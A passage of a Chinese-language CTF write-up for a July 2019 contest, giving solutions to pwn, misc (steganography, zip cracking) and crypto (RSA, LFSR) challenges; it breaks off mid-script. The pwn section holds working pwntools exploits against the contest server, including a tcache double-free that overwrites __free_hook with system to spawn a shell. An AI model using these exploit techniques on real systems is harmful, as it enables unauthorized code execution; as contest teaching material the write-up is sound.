id="通过逆向可以发现程序将flag存入了内存中-并且我们可以选择flag对应的下标进行对比-可是4字节的shellcode有着限制-并且v5是call-shellcode之后的返回值-那么就必须在shellcode中对rax进行赋值操作-可以观察到r9寄存器的大小是跟printf出来的字节数相关-那么就可以通过push-r9-pop-rax-ret-三个操作来对rax赋值-进而根据程序最后的判断来确认我们猜测的flag对应下标的那个字母是否正确-接下来就是爆破就完事了"><a href="#通过逆向可以发现程序将flag存入了内存中-并且我们可以选择flag对应的下标进行对比-可是4字节的shellcode有着限制-并且v5是call-shellcode之后的返回值-那么就必须在shellcode中对rax进行赋值操作-可以观察到r9寄存器的大小是跟printf出来的字节数相关-那么就可以通过push-r9-pop-rax-ret-三个操作来对rax赋值-进而根据程序最后的判断来确认我们猜测的flag对应下标的那个字母是否正确-接下来就是爆破就完事了" class="headerlink" title="通过逆向可以发现程序将flag存入了内存中,并且我们可以选择flag对应的下标进行对比,可是4字节的shellcode有着限制,并且v5是call shellcode之后的返回值,那么就必须在shellcode中对rax进行赋值操作,可以观察到r9寄存器的大小是跟printf出来的字节数相关,那么就可以通过push r9,pop rax,ret,三个操作来对rax赋值,进而根据程序最后的判断来确认我们猜测的flag对应下标的那个字母是否正确,接下来就是爆破就完事了"></a>通过逆向可以发现程序将flag存入了内存中,并且我们可以选择flag对应的下标进行对比,可是4字节的shellcode有着限制,并且v5是call shellcode之后的返回值,那么就必须在shellcode中对rax进行赋值操作,可以观察到r9寄存器的大小是跟printf出来的字节数相关,那么就可以通过push r9,pop rax,ret,三个操作来对rax赋值,进而根据程序最后的判断来确认我们猜测的flag对应下标的那个字母是否正确,接下来就是爆破就完事了</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line">context.log_level='CRITICAL' </span><br><span class="line">#context.log_level = 'debug' </span><br><span class="line">def flag_index(index): </span><br><span class="line">   sh.sendline(str(index)) </span><br><span class="line">def code(code): </span><br><span class="line">    sh.send(code) </span><br><span class="line">def name(size,content): </span><br><span class="line">    sh.recvuntil('tell me your name size:\n') </span><br><span class="line">    sh.sendline(str(size)) </span><br><span class="line">    sh.recvuntil('input your name:\n') </span><br><span class="line">    sh.sendline(content) </span><br><span class="line">flag=open('./pwn4_flag','a+') </span><br><span class="line">try: </span><br><span class="line">    for index in range(32): </span><br><span class="line">        for i in range(0x1,0x7f): </span><br><span class="line">            sh=remote('47.110.227.208',10004) </span><br><span class="line">            #sh=process('./pwn4') </span><br><span class="line">            sh.recvuntil('this is my gift for you, take it!\n') </span><br><span class="line">            flag_index(index) </span><br><span class="line">            sh.recvuntil('input your code:\n') </span><br><span class="line">            code('AQX\xC3') </span><br><span class="line">            padding='a'.ljust(i,'a') </span><br><span class="line">            name(0x100,padding) </span><br><span class="line">            sh.recvuntil('Hello are you ready? '+padding+'\n') </span><br><span class="line">            sh.sendline() </span><br><span class="line">            info = sh.recv() </span><br><span class="line">            if((info).find('bye!') != -1): </span><br><span class="line">                print  chr(i+0x16) </span><br><span class="line">                flag.write(chr(i+0x16)) </span><br><span class="line">                sh.close() </span><br><span class="line">                break </span><br><span class="line">            else: </span><br><span class="line">                sh.close() </span><br><span class="line">except KeyboardInterrupt: </span><br><span class="line">    flag.close() </span><br><span class="line">    exit(0) </span><br><span class="line">except: </span><br><span class="line">    flag.close() </span><br><span class="line">    sh.close()</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/5.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/5.png" class="lazyload"></a></p><h2 id="0x5babyheap"><a href="#0x5babyheap" class="headerlink" title="0x5babyheap"></a>0x5<a href="babyheap.rar">babyheap</a></h2><h3 id="由于有一个check过不去，导致我没办法fastbin-attack，总的来说是我太菜了。"><a href="#由于有一个check过不去，导致我没办法fastbin-attack，总的来说是我太菜了。" class="headerlink" title="由于有一个check过不去，导致我没办法fastbin attack，总的来说是我太菜了。"></a>由于有一个check过不去，导致我没办法fastbin attack，总的来说是我太菜了。</h3><h3 id="0x6-babytcach"><a href="#0x6-babytcach" class="headerlink" title="0x6 babytcach"></a>0x6 <a href="babytcache.rar">babytcach</a></h3><h3 id="checksec-可以看到程序没有开PIE-同时bss中存放了IO-2-1-stdout-的地址-并且libc2-27有double-free-所以思路就很明确了-有了double-free就可以malloc-2-everywhere-所以这样一的难点在于如何leak-libc-通过double-free-可以让fd指向-IO-2-1-stdout-从而malloc-2-IO-2-1-stdout-从而修改write-base来leak-libc-之后再double-free去修改free-hook为system-去free一个-bin-sh就可以了"><a href="#checksec-可以看到程序没有开PIE-同时bss中存放了IO-2-1-stdout-的地址-并且libc2-27有double-free-所以思路就很明确了-有了double-free就可以malloc-2-everywhere-所以这样一的难点在于如何leak-libc-通过double-free-可以让fd指向-IO-2-1-stdout-从而malloc-2-IO-2-1-stdout-从而修改write-base来leak-libc-之后再double-free去修改free-hook为system-去free一个-bin-sh就可以了" class="headerlink" title="checksec 可以看到程序没有开PIE,同时bss中存放了IO_2_1_stdout_的地址,并且libc2.27有double free,所以思路就很明确了.有了double free就可以malloc 2 everywhere,所以这样一的难点在于如何leak libc,通过double free,可以让fd指向_IO_2_1_stdout,从而malloc 2 IO_2_1_stdout,从而修改write_base来leak libc,之后再double free去修改free_hook为system,去free一个/bin/sh就可以了"></a>checksec 可以看到程序没有开PIE,同时bss中存放了<em>IO_2_1_stdout_的地址,并且libc2.27有double free,所以思路就很明确了.有了double free就可以malloc 2 everywhere,所以这样一的难点在于如何leak libc,通过double free,可以让fd指向_IO_2_1_stdout</em>,从而malloc 2 <em>IO_2_1_stdout</em>,从而修改write_base来leak libc,之后再double free去修改free_hook为system,去free一个/bin/sh就可以了</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line">libc=ELF('./libc.so') </span><br><span class="line">sh=remote("47.110.227.208",10006) </span><br><span class="line"># CyCTF{Tc4ch3_Att4ck_Is_S1mpl3_R1ght?} </span><br><span class="line">def add(size,content): </span><br><span class="line">    sh.sendline('1') </span><br><span class="line">    sh.recvuntil('input your size:') </span><br><span class="line">    sh.sendline(str(size)) </span><br><span class="line">    sh.recvuntil('input your message:') </span><br><span class="line">    sh.send(content) </span><br><span class="line">    sh.recvuntil('Done!\n') </span><br><span class="line">def add2(size,content): </span><br><span class="line">    sh.sendline('1') </span><br><span class="line">    sh.recvuntil('input your size:') </span><br><span class="line">    sh.sendline(str(size)) </span><br><span class="line">    sh.recvuntil('input your message:') </span><br><span class="line">    sh.send(content) </span><br><span class="line">    #sh.recvuntil('Done!\n') </span><br><span class="line">def delete(index): </span><br><span class="line">    sh.sendline('2') </span><br><span class="line">    sh.recvuntil('input the index: ') </span><br><span class="line">    sh.sendline(str(index)) </span><br><span class="line">def main(): </span><br><span class="line">    add(0x100,'a\n') </span><br><span class="line">    add(0x100,'a\n') </span><br><span class="line">    add(0x100,'a\n') </span><br><span class="line">    delete(0) </span><br><span class="line">    delete(0) </span><br><span class="line">    add(0x100,p64(0x0000000000602020)+'\n') </span><br><span class="line">    add(0x100,p64(0x0000000000602020)+'\n') </span><br><span class="line">    add(0x100,'\n') </span><br><span class="line">    add2(0x100,p64(0xfbad1880)+p64(0x0)*3+'\x20\n') </span><br><span class="line">    libc_base=u64(sh.recv(6)+'\x00\x00')-0x3eb780 </span><br><span class="line">    print "libc_base -> " + hex(libc_base) </span><br><span class="line">    free_hook=libc_base+libc.symbols['__free_hook'] </span><br><span class="line">    system=libc_base+libc.symbols['system'] </span><br><span class="line">    sh.recvuntil('Done!\n') </span><br><span class="line">    add(0x10,'/bin/sh\x00\n') # index 7 </span><br><span class="line">    add(0x20,'\n') # index 8 </span><br><span class="line">    delete(8) </span><br><span class="line">    delete(8) </span><br><span class="line">    add(0x20,p64(free_hook)+'\n') </span><br><span class="line">    add(0x20,p64(free_hook)+'\n') </span><br><span class="line">    add(0x20,p64(system)+'\n') </span><br><span class="line">    delete(7) </span><br><span class="line">    sh.interactive() </span><br><span class="line">if __name__ == '__main__': </span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/4.png" class="lazyload"></a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h2 id="0x1-sign-in"><a href="#0x1-sign-in" class="headerlink" title="0x1 sign in"></a>0x1 <a href="6.png">sign in</a></h2><h3 id><a href="#" class="headerlink" title></a><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/6.png" data-fancybox="group" data-caption="sign in" class="fancybox"><img alt="sign in" title="sign in" data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/6.png" class="lazyload"></a></h3><h3 id="扫码即可得到flag"><a href="#扫码即可得到flag" class="headerlink" title="扫码即可得到flag"></a>扫码即可得到flag</h3><h3 id="0x2-No-Word"><a href="#0x2-No-Word" class="headerlink" title="0x2 No_Word"></a>0x2 <a href="No_Word.docx">No_Word</a></h3><h3 id="snow加密，将文件放入010editor看他的十六进制形式。"><a href="#snow加密，将文件放入010editor看他的十六进制形式。" class="headerlink" title="snow加密，将文件放入010editor看他的十六进制形式。"></a>snow加密，将文件放入010editor看他的十六进制形式。</h3><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/7.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/7.png" class="lazyload"></a></p><h3 id="0D0A是换行，剩下的将20转0，将09转1，得到的二进制数据，转字符串即可得到flag。"><a href="#0D0A是换行，剩下的将20转0，将09转1，得到的二进制数据，转字符串即可得到flag。" class="headerlink" title="0D0A是换行，剩下的将20转0，将09转1，得到的二进制数据，转字符串即可得到flag。"></a>0D0A是换行，剩下的将20转0，将09转1，得到的二进制数据，转字符串即可得到flag。</h3><h2 id="0x3-基础社工"><a href="#0x3-基础社工" class="headerlink" title="0x3 基础社工"></a>0x3 基础社工</h2><h3 id="题目介绍：大家都用着我们的数字杭电（i-hdu-edu-cn-但是对于其注册者却啥也不知道，所以小y打算去看看注册数字杭电的创始人的邮箱"><a href="#题目介绍：大家都用着我们的数字杭电（i-hdu-edu-cn-但是对于其注册者却啥也不知道，所以小y打算去看看注册数字杭电的创始人的邮箱" class="headerlink" title="题目介绍：大家都用着我们的数字杭电（i.hdu.edu.cn)但是对于其注册者却啥也不知道，所以小y打算去看看注册数字杭电的创始人的邮箱"></a>题目介绍：大家都用着我们的数字杭电（i.hdu.edu.cn)但是对于其注册者却啥也不知道，所以小y打算去看看注册数字杭电的创始人的邮箱</h3><p>flag形式为：flag{你找到的电子邮箱}</p><h3 id="百度一个IP反查询工具，Whois查询，看看这个IP的备案，"><a href="#百度一个IP反查询工具，Whois查询，看看这个IP的备案，" class="headerlink" title="百度一个IP反查询工具，Whois查询，看看这个IP的备案，"></a>百度一个IP反查询工具，Whois查询，看看这个IP的备案，</h3><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/8.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/8.png" class="lazyload"></a></p><h2 id="0x4-The-world-The-World-jpg"><a href="#0x4-The-world-The-World-jpg" class="headerlink" title="0x4 [The world](The World.jpg)"></a>0x4 [The world](The World.jpg)</h2><p>![](The World.jpg)</p><h3 id="下载得到一张图，猜测是隐写，直接foremost分解，得到四张图，"><a href="#下载得到一张图，猜测是隐写，直接foremost分解，得到四张图，" class="headerlink" title="下载得到一张图，猜测是隐写，直接foremost分解，得到四张图，"></a>下载得到一张图，猜测是隐写，直接foremost分解，得到四张图，</h3><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/9.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/9.png" class="lazyload"></a></p><h3 id="第一张是可见的，应该没用，剩下来的，按顺序看。"><a href="#第一张是可见的，应该没用，剩下来的，按顺序看。" class="headerlink" title="第一张是可见的，应该没用，剩下来的，按顺序看。"></a>第一张是可见的，应该没用，剩下来的，按顺序看。</h3><h3 id="第一份压缩包是加密压缩包，看了一下不是伪加密，于是放入工具进行简单爆破，得到密码abc123，得到文件："><a href="#第一份压缩包是加密压缩包，看了一下不是伪加密，于是放入工具进行简单爆破，得到密码abc123，得到文件：" class="headerlink" title="第一份压缩包是加密压缩包，看了一下不是伪加密，于是放入工具进行简单爆破，得到密码abc123，得到文件："></a>第一份压缩包是加密压缩包，看了一下不是伪加密，于是放入工具进行简单爆破，得到密码abc123，得到文件：</h3><h3 id="d2abd3fb9d4c93fb064abf81f5fab84"><a href="#d2abd3fb9d4c93fb064abf81f5fab84" class="headerlink" title="d2abd3fb9d4c93fb064abf81f5fab84"></a>d2abd3fb9d4c93fb064abf81f5fab84</h3><h3 id="新手村钥匙"><a href="#新手村钥匙" class="headerlink" title="新手村钥匙"></a>新手村钥匙</h3><h3 id="第二份文件是一张图，猜测是LSB隐写，密码为上述字符串，测试后发现不是。继续考虑，可能是-outguess加密，"><a href="#第二份文件是一张图，猜测是LSB隐写，密码为上述字符串，测试后发现不是。继续考虑，可能是-outguess加密，" class="headerlink" title="第二份文件是一张图，猜测是LSB隐写，密码为上述字符串，测试后发现不是。继续考虑，可能是### outguess加密，"></a>第二份文件是一张图，猜测是LSB隐写，密码为上述字符串，测试后发现不是。继续考虑，可能是### outguess加密，</h3><h3 id="outguess-r-flag-jpg-t-secret-txt-k-d2abd3fb9d4c93fb064abf81f5fab84"><a href="#outguess-r-flag-jpg-t-secret-txt-k-d2abd3fb9d4c93fb064abf81f5fab84" class="headerlink" title="outguess -r flag.jpg -t secret.txt -k d2abd3fb9d4c93fb064abf81f5fab84"></a>outguess -r flag.jpg -t secret.txt -k d2abd3fb9d4c93fb064abf81f5fab84</h3><h3 id="得到文件"><a href="#得到文件" class="headerlink" title="得到文件"></a>得到文件</h3><h3 id="95cca6c50e48e86c468ee329ddc11047"><a href="#95cca6c50e48e86c468ee329ddc11047" class="headerlink" title="95cca6c50e48e86c468ee329ddc11047"></a>95cca6c50e48e86c468ee329ddc11047</h3><h3 id="最后一关大门的钥匙"><a href="#最后一关大门的钥匙" class="headerlink" title="最后一关大门的钥匙"></a>最后一关大门的钥匙</h3><h3 id="第三份文件是一个mp3文件，猜测是MP3隐写，用MP3Stego解密，即可得到flag"><a href="#第三份文件是一个mp3文件，猜测是MP3隐写，用MP3Stego解密，即可得到flag" class="headerlink" title="第三份文件是一个mp3文件，猜测是MP3隐写，用MP3Stego解密，即可得到flag"></a>第三份文件是一个mp3文件，猜测是MP3隐写，用MP3Stego解密，即可得到flag</h3><h2 id="0x5-Different-P"><a href="#0x5-Different-P" class="headerlink" title="0x5 Different_P"></a>0x5 <a href="Different_P.rar">Different_P</a></h2><h3 id="hint：PIL是个好东西"><a href="#hint：PIL是个好东西" class="headerlink" title="hint：PIL是个好东西"></a>hint：PIL是个好东西</h3><h3 id="下载得到两份一样的文件，试了试盲水印，发现没有用。使用Beyond-Compare-4结合后发现"><a href="#下载得到两份一样的文件，试了试盲水印，发现没有用。使用Beyond-Compare-4结合后发现" class="headerlink" title="下载得到两份一样的文件，试了试盲水印，发现没有用。使用Beyond Compare 4结合后发现"></a>下载得到两份一样的文件，试了试盲水印，发现没有用。使用Beyond Compare 4结合后发现</h3><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/10.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/10.png" class="lazyload"></a></p><h3 id="字符这里有点东西。根据题目提示，猜测要将两张图片的所有元素点的灰度拿来作比较，"><a href="#字符这里有点东西。根据题目提示，猜测要将两张图片的所有元素点的灰度拿来作比较，" class="headerlink" title="字符这里有点东西。根据题目提示，猜测要将两张图片的所有元素点的灰度拿来作比较，"></a>字符这里有点东西。根据题目提示，猜测要将两张图片的所有元素点的灰度拿来作比较，</h3><h3 id="构造脚本如下"><a href="#构造脚本如下" class="headerlink" title="构造脚本如下"></a>构造脚本如下</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import base64</span><br><span class="line">from PIL import Image</span><br><span class="line">im = Image.open("f1.png").convert("L")</span><br><span class="line">im2 = Image.open("f2.png").convert("L")</span><br><span class="line">width=im.size[0]  #图片宽</span><br><span class="line">height=im.size[1] #图片高</span><br><span class="line">dd=''</span><br><span class="line">flag1=''</span><br><span class="line">for x in range(0,width):</span><br><span class="line">    for y in range(0,height):</span><br><span class="line">        data  = im .getpixel((x,y)) </span><br><span class="line">        data2 = im2.getpixel((x,y))</span><br><span class="line">        if(data!=255 or data2!=255):</span><br><span class="line">        dd=dd+str(data-data2)</span><br><span class="line">for i in range (int(len(dd)/8)):</span><br><span class="line">    word = dd[i*8:(i+1)*8]</span><br><span class="line">    word = int(word,2)</span><br><span class="line">    flag1 +=chr(int(word))</span><br><span class="line">missing_padding = 4 - len(flag1)%4</span><br><span class="line">if missing_padding:</span><br><span class="line">    flag1+= '='*missing_padding</span><br><span class="line">flag = base64.b64decode(flag1)</span><br><span class="line">pic = open('flag.png','wb')</span><br><span class="line">pic.write(flag)</span><br><span class="line">pic.close()</span><br></pre></td></tr></tbody></table></figure></div><h3 id="得到一张图片，但是打不开，看他的十六进制数据发现文件头被改了。改回来后得到一张二维码，扫码得到flag"><a href="#得到一张图片，但是打不开，看他的十六进制数据发现文件头被改了。改回来后得到一张二维码，扫码得到flag" class="headerlink" title="得到一张图片，但是打不开，看他的十六进制数据发现文件头被改了。改回来后得到一张二维码，扫码得到flag"></a>得到一张图片，但是打不开，看他的十六进制数据发现文件头被改了。改回来后得到一张二维码，扫码得到flag</h3><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/11.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/11.png" class="lazyload"></a></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h2 id="0x1-easy-RSA"><a href="#0x1-easy-RSA" class="headerlink" title="0x1 easy_RSA"></a>0x1 <a href="easy_RSA.rar">easy_RSA</a></h2><h3 id="题目文件是public-pem-和-flag-enc，先用openssl打开-pem文件"><a href="#题目文件是public-pem-和-flag-enc，先用openssl打开-pem文件" class="headerlink" title="题目文件是public.pem 和 flag.enc，先用openssl打开.pem文件"></a>题目文件是public.pem 和 flag.enc，先用openssl打开.pem文件</h3><h3 id="openssl-rsa-pubin-text-modulus-in-public-pem"><a href="#openssl-rsa-pubin-text-modulus-in-public-pem" class="headerlink" title="openssl rsa -pubin -text -modulus -in public.pem"></a>openssl rsa -pubin -text -modulus -in public.pem</h3><h3 id="得到"><a href="#得到" class="headerlink" title="得到"></a>得到</h3><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/12.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/12.png" class="lazyload"></a></p><h3 id="其中。N-gt-Modulus，e-gt-Exponent"><a href="#其中。N-gt-Modulus，e-gt-Exponent" class="headerlink" title="其中。N=>Modulus，e=>Exponent"></a>其中。N=>Modulus，e=>Exponent</h3><h3 id="没有更多信息与算法了，猜测这个大数可以直接分解，上yafu。随后用rsatool生成-pem文件，-再用openssl解密flag-enc，得到字符串"><a href="#没有更多信息与算法了，猜测这个大数可以直接分解，上yafu。随后用rsatool生成-pem文件，-再用openssl解密flag-enc，得到字符串" class="headerlink" title="没有更多信息与算法了，猜测这个大数可以直接分解，上yafu。随后用rsatool生成.pem文件，### 再用openssl解密flag.enc，得到字符串"></a>没有更多信息与算法了，猜测这个大数可以直接分解，上yafu。随后用rsatool生成.pem文件，### 再用openssl解密flag.enc，得到字符串</h3><h2 id="Y-s04tEP-ygraCl-f"><a href="#Y-s04tEP-ygraCl-f" class="headerlink" title="}Y!s04tEP{ygraCl_f"></a>}Y!s04tEP{ygraCl_f</h2><h3 id="栅栏加方向即可得到flag，"><a href="#栅栏加方向即可得到flag，" class="headerlink" title="栅栏加方向即可得到flag，"></a>栅栏加方向即可得到flag，</h3><h3 id="rsatool和openssl的使用参考"><a href="#rsatool和openssl的使用参考" class="headerlink" title="rsatool和openssl的使用参考"></a>rsatool和openssl的使用参考</h3><h3 id="https-www-cnblogs-com-Byqiyou-p-9410885-html"><a href="#https-www-cnblogs-com-Byqiyou-p-9410885-html" class="headerlink" title="https://www.cnblogs.com/Byqiyou/p/9410885.html"></a><a href="https://www.cnblogs.com/Byqiyou/p/9410885.html" target="_blank" rel="noopener">https://www.cnblogs.com/Byqiyou/p/9410885.html</a></h3><h2 id="0x2-川流不息"><a href="#0x2-川流不息" class="headerlink" title="0x2 川流不息"></a>0x2 <a href="川流不息.rar">川流不息</a></h2><h3 id="题目加密脚本和密文"><a href="#题目加密脚本和密文" class="headerlink" title="题目加密脚本和密文"></a>题目加密脚本和密文</h3><h3 id="加密脚本"><a href="#加密脚本" class="headerlink" title="加密脚本"></a>加密脚本</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from parameters import a</span><br><span class="line">def stream(init,size):</span><br><span class="line">    if len(init) < 5:</span><br><span class="line">        return init</span><br><span class="line">    result = init[:5]</span><br><span class="line">    for index in range(size-5):</span><br><span class="line">        mid = (result[index] * a[0]) ^ (result[index + 1] * a[1]) ^ (result[index + 2] * a[2]) ^ (result[index + 3] * a[3]) ^ (result[index+4] * a[4])</span><br><span class="line">        result.append(mid)</span><br><span class="line">    return result</span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    with open('flag','r') as f:</span><br><span class="line">        flag = f.readline().strip()</span><br><span class="line">    plain = ''.join(bin(ord(i))[2:].rjust(8,'0') for i in flag)</span><br><span class="line">    key = stream([1,0,0,1,1,0,1,0,0,1],len(plain))</span><br><span class="line">    cipher = ''</span><br><span class="line">    for i in range(len(plain)):</span><br><span class="line">        cipher += str(int(plain[i]) ^ key[i])</span><br><span class="line">    print cipher</span><br></pre></td></tr></tbody></table></figure></div><h3 id="首先，根据flag前五个字符“flag-”和密文，异或可以得到key的前四十个值，然后爆破得到a"><a href="#首先，根据flag前五个字符“flag-”和密文，异或可以得到key的前四十个值，然后爆破得到a" class="headerlink" title="首先，根据flag前五个字符“flag{”和密文，异或可以得到key的前四十个值，然后爆破得到a"></a>首先，根据flag前五个字符“flag{”和密文，异或可以得到key的前四十个值，然后爆破得到a</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">def stream(init,size):</span><br><span class="line">    key=[1,0,0,1,1,0,1,0,0,1,0,0,0,0,1,0,1,0,1,1,1,0,1,1,0,0,0,1,1,1,1,1,0,0,1,1,0,1,0,0]</span><br><span class="line">    for i in range(2):</span><br><span class="line">        for j in range(2):</span><br><span class="line">            for k in range(2):</span><br><span class="line">                for p in range(2):</span><br><span class="line">                    for q in range(2):</span><br><span class="line">                        a=[i,j,k,p,q]</span><br><span class="line">                        result = init[:5]</span><br><span class="line">                        for index in range(size-5):</span><br><span class="line">                            mid = (result[index] * a[0]) ^ (result[index + 1] * a[1]) ^ (result[index + 2] * a[2]) ^ (result[index + 3] * a[3]) ^ (result[index+4] * a[4])</span><br><span class="line">                            result.append(mid)</span><br><span class="line">                        if result==key:</span><br><span class="line">                            print(a)</span><br><span class="line">                            break</span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    </span><br><span class="line">    flag = "flag{"</span><br><span class="line">    plain = ''.join(bin(ord(i))[2:].rjust(8,'0') for i in flag)</span><br><span class="line">    